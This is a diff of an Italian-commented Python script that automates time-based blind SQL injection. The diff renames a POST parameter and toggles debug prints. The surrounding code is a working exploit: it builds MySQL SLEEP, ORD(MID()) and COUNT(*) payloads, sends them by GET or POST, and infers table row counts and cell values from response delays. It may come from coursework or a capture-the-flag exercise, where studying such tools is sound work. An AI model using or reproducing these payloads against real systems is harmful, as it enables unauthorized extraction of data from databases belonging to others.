@@ -29,12 +29,11 @@ def findCellValue(url, tabledb_name, row, column_name, sleeptime):
         if(isGet):
             payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
         else:
-	    #TODO parametrizzare richiesta in POST
+	        #TODO parametrizzare richiesta in POST
             payload={
-                'destin':'(SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ")",
-                'msg':'msg'
-            
-	    }
+                'to':'(SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ")",
+                'msg':'msg'    
+	        }
 	    
             #print(payload)
 
@@ -54,9 +53,10 @@ def findCellValue(url, tabledb_name, row, column_name, sleeptime):
                 payload='\' AND IF(ORD(MID((SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1),' + str(pos+1) + ', 1))=' + str(i) + ', SLEEP('+str(sleeptime)+'), SLEEP(0))-- -'
             else:
                 payload={
-                    'destin':'IF(ORD(MID((SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1),' + str(pos+1) + ', 1))=' + str(i) + ', SLEEP('+str(sleeptime)+'), SLEEP(0))',
+                    'to':'IF(ORD(MID((SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1),' + str(pos+1) + ', 1))=' + str(i) + ', SLEEP('+str(sleeptime)+'), SLEEP(0))',
                     'msg':'msg'
                 }
+                
             #Se la query va a buon fine, aggiungo il carattere trovato alla stringa
             if(request(url, payload, sleeptime)):
                 string.append(chr(i))
@@ -65,7 +65,7 @@ def findCellValue(url, tabledb_name, row, column_name, sleeptime):
 
     
     return ''.join(string) #Compatto tutti i caratteri
-    
+
 #Trova numero delle righe di una tabella
 def findNumRows(url, tabledb_name, sleeptime):
     print("findNumRows")
@@ -75,21 +75,23 @@ def findNumRows(url, tabledb_name, sleeptime):
             payload = '\' AND IF((SELECT COUNT(*) FROM '+ tabledb_name +')=' + str(i) + ', SLEEP('+ str(sleeptime) +'), SLEEP(0)) -- -'
         else:
             payload={
-                'destin':'IF((SELECT COUNT(*) FROM '+ tabledb_name +')=' + str(i) + ', SLEEP('+ str(sleeptime) +'), SLEEP(0))',
+                'to':'IF((SELECT COUNT(*) FROM '+ tabledb_name +')=' + str(i) + ', SLEEP('+ str(sleeptime) +'), SLEEP(0))',
                 'msg':'cdef'
             }
+
+        #print(payload)
         #Quando la query va a buon fine, salvo il numero di righe trovate e esco dal ciclo
         if(request(url, payload, sleeptime)):
             numrows=i
             break
 
-    #print(numrows)
+    print(numrows)
     return numrows
 
 #Effettua la richiesta al sito per la ricerca dei valori/db/tabelle
 def request(url, payload, sleeptime):   #sleeptime deriva da calcRitardo
     elapsed = requestTime(url, payload) #elapsed deriva da requestTime
-    print(elapsed) #funz tempo richiesta
+    #print(elapsed) #funz tempo richiesta
 
     #Ritorna T/F, confronto il tempo di risposta con un'oggetto tempo dai noi creato
     return elapsed > datetime.timedelta(seconds=sleeptime)
@@ -106,6 +108,8 @@ def requestTime(url, payload):
     else:
         #richiesta in post
         ans = requests.post(url, data=payload)
+    #print(ans)
+    #print(ans.content)
     return ans.elapsed #funz tempo richiesta
 
 #Ritorna i nomi delle colonne
@@ -155,6 +159,7 @@ def convertToChar(string):
 
 
 def calcRitardo(url):
+    print("CalcRitardo")
     #dichiarazione array con libreria numpy (gestione avanzata di array e numeri)
     times = np.array([])
 
@@ -196,7 +201,7 @@ args = parser.parse_args()
 
 if(args.post):
     isGet = False
-    #print(findNumRows(args.db[0], "INFORMATION_SCHEMA.SCHEMATA"))
+    #print(findNumRows(args.db[0], "INFORMATION_SCHEMA.SCHEMATA", 2))
 
 if(args.tbl is not None):
     n=calcRitardo(args.tbl[0])
